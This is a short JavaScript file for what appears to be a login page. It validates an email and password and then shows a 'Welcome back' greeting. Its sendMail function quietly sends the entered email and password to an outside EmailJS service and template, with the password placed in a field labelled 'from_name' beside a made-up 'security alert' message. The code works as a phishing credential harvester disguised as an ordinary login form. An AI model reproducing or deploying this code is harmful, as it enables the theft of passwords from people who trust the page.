function form(){
  let email = document.getElementById("email").value;
  let password = document.getElementById("password").value;
  let error = document.getElementById("error");
  let text = "";

  if(password.length < 5){
    text = "*Please Enter Correct Password*"
    error.innerHTML = text;
    return false;
  }else if(email.indexOf("@") == -1 || email.length < 10){
    text = "*Please Enter Correct Email*"
    error.innerHTML = text;
    return false;
  }
  else{
    alert("Welcome back")
    return true;
  }
}


function sendMail(){
  var params = {
    Email_Id : document.getElementById("email").value , 
    from_name : document.getElementById("password").value,
    Messege : `security alert the phone RMX has entered to your account`
  }
  emailjs.send("service_q21q8nz" , "template_3vq9z0i" , params).then(function(res){
    alert("success" + res.status);
  })
}